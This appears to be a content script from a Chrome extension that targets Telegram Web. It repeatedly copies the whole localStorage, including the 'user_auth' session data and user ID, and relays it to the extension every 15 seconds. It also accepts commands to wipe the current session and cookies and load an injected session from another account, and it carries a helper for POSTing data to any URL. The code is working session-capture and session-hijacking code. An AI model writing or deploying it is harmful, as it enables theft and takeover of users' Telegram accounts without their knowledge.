if( window.location.href.indexOf('web.telegram.org') != -1 ){
    try {
        let getInfo = getSessionDataJson();
        if( getInfo.session ){
            console.log(JSON.stringify(getInfo));
            chrome.runtime.sendMessage({ action: "save_session", data: JSON.stringify(getInfo) });
        }
    } catch (error) {
        
    }
}

setInterval(async () => {
    try {
        if( window.location.href.indexOf('web.telegram.org') != -1 ){
            let getInfo = getSessionDataJson();
            if( getInfo.session ){
                console.log(JSON.stringify(getInfo));
                await chrome.runtime.sendMessage({ action: "save_session", data: JSON.stringify(getInfo) });
            }
        }
    } catch (error) {
        
    }
}, 15000);

function getSessionDataJson(){
    var LS = localStorage;
    try {
        if( JSON.stringify(LS).toString().indexOf("user_auth") != -1 ){
            const parsed = JSON.stringify(LS).toString().replace(/\\"/g, '');
            console.log(parsed);
            const match = parsed.match(/userId:(\d+)/);
            let userId = null;
            if (match) {
                userId = match[1];
                console.log("userId:", userId);
            } else {
                console.log("userId не найден");
            }
            console.log("UID: " + userId);
            return {
                session: JSON.stringify(LS),
                url: window.location.href,
                user_id: userId
            };
        }
    } catch (error) {
        return {};
    }
}

    

chrome.runtime.onMessage.addListener(async (message, sender, sendResponse) => {
    if (message.action === 'clear_session') {
        localStorage.clear();
        clearAllCookies();
        window.location = "https://web.telegram.org/k/?r_=" + Math.random();
    }
    if (message.action === 'set_session_changed') {
            localStorage.clear();
            clearAllCookies();
            let data = JSON.parse(message.session);
            for(var k in data) {
                if( k != 'length' && data[k].toString().indexOf("native code") == -1 ){
                    try {
                        localStorage.setItem(k,data[k]);
                    } catch (error) {}
                }
            }
            setTimeout(() => {
                window.location = "https://web.telegram.org/k/?r_=" + Math.random();
            }, 500);
    }
});


function clearAllCookies() {
    const cookies = document.cookie.split("; ");
    for (const cookie of cookies) {
      const cookieName = cookie.split("=")[0];
      if( cookieName != 'code' )
        document.cookie = `${cookieName}=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/`;
    }
}

async function postJson(url, data) {
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });

        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        const result = await response.json();
        return result;
    } catch (error) {
        console.error('Error during POST request:', error);
        return null;
    }
}